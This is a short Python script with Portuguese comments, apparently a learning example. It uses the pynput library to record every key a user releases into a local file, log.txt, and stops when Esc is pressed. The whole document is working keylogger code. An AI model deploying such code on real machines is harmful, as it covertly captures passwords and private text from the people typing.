from pynput.keyboard import Listener, Key # importamos a biblioteca pynput módulo keybord a classe listener e a classe Key para verificar se é igual a tecla digitada

def log(text):
    with open("log.txt", "a") as file_log: # é criado o arquivo log.txt para armazenar o que for digitado, ou salva ao final do arquivo as modificações caso o arquivo já exista
        file_log.write(text) # escreve no arquivo

def monitor(key): # metodo que recebe o key do listener
    try:
        log(key.char)
    except AttributeError:
        log(" <"+str(key)+"> ")
    if key == Key.esc: # quando pressionada a tecla esc o programa é executado
        return False

with Listener(on_release=monitor) as listener: # executar o modulo listener
    listener.join()